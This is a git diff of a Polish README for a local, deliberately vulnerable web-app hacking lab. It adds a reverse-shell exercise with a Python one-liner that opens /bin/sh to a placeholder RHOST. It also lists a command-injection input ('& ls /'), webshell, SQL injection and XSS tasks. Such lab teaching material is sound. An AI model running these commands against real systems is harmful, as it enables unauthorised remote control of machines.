@@ -28,6 +28,7 @@ Jeśli wystąpią problemy:
 1. Dodaj siebie do grupy `docker`. `sudo usermod -aG docker $USER`.
 1. Opcjonalnie zrestartuj serwis `sudo service docker restart`.
 1. Uruchom dockera z pozycji roota `sudo docker-compose up`.
+1. Jeśli pojawia się błąd, że adres jest już _"zbindowany"_ `sudo service apache2 stop`
 
 Kod źródłowy każdej strony możesz podejrzeć na `http://127.0.0.1/index.php?page=source-viewer.php`
 
@@ -126,12 +127,28 @@ Podpowiedź: Zobacz jak działa metoda `innerHTML`
 1. Webshell
 1. `& ls /` on DNSlookup site
 
+
+### Lab 4 - Reverse shell
+Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, które można sprawdzać to połączenia TCP/UPD na niefiltrowanych portach.
+
+1. Upewnij się, że aplikacja ciągle działa w tle.
+1. Na jednym terminalu ustaw nasłuchiwanie na dowolnym niefiltrowanym porcie (np. 1337)
+1. Na drugim terminalu wpisz poniższą komendę:
+```
+export RHOST="X.X.X.X";export RPORT=XXXX;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+1. Jeśli wpisałeś inny port pamiętaj, żeby go zmienić razem z adresem twojej strony!
+1. W nasłuchiwanym terminalu powinien pojawić się shell.
+![Reverse shell](assets/z3.png) 
+
 ### Lab 4 - Dodatkowe
 Ta część laboratorium jest przeznaczona na własny rekonesans. Wcześniejsze przykłady były podane w wąskim zakresie dlatego teraz pora na rozwinięcie skrzydeł. Przetestuj aplikację we własnym zakresie - z tym co wiesz lub chcesz poznać. Propozycja: skorzystaj z podanych list i testuj wszystko po kolei. 
 
-Jeśli testując elementy aplikacji uznasz atak siłowy za potrzebny to skorzystaj z payload'ów z tego repozytorium:
+Jeśli testując elementy aplikacji uznasz atak siłowy za potrzebny to skorzystaj z payload'ów z tego repozytorium:  
+
 [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
+1. Niektóre podatności (np. XSS) występują na innych stronach. Postaraj się je odszukać.
 1. Znajdź inne podatności np. na stronie logowania (`SQL injection`)
 
 
